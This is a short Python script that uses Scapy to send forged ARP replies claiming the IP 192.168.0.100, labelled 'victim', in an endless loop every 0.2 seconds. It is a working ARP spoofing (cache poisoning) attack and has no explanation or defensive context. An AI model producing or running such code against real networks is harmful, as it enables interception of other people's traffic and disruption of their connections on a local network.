## Import Scapy module
from scapy.all import *

packet = Ether()/ARP()
packet.op = 2 #replay
packet.psrc="192.168.0.100" #victim
sendp(packet, loop =1, inter = .2)

# packet.show()